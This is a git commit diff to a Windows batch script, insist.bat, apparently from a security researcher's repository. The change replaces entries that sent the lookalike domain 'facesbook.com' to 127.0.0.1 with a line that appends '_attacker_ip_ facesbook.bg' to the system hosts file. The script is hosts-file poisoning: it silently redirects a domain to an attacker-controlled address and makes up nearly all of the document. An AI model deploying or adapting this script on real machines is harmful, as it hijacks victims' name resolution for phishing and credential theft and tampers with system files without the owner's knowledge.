108e331284a13a46480c710b885c1f8e4ed7f94d
nu11secur1ty <venvaropt@gmail.com>
2019-11-21 14:01:34 +0200

    Update insist.bat

--- hosts/windows/insist.bat
+++ hosts/windows/insist.bat
@@ -2,6 +2,5 @@
 
 set hostspath=%windir%\System32\drivers\etc\hosts
 
-echo 127.0.0.1           facesbook.com >> %hostspath%
-echo 127.0.0.1           www.facesbook.com >> %hostspath%
+echo _attacker_ip_           facesbook.bg >> %hostspath%
 exit
